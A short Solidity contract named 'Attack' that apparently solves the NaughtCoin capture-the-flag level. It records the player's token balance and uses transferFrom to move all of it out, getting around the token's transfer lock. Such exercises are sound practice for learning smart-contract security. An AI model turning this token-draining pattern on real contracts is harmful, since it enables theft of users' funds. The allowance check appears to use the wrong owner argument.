// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;
import "lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

interface INaughtCoin {
    function player() external view returns (address);
}

contract Attack {
    address public target;
    address public player;
    uint256 public bal;
    uint256 public check;

    constructor(address _target) {
        target = _target;
        player = INaughtCoin(target).player();
        bal = IERC20(target).balanceOf(player);
        check = IERC20(target).allowance(target, address(this));
    }

    function attack() external {

        IERC20(target).transferFrom(player, address(this), bal);
    }
}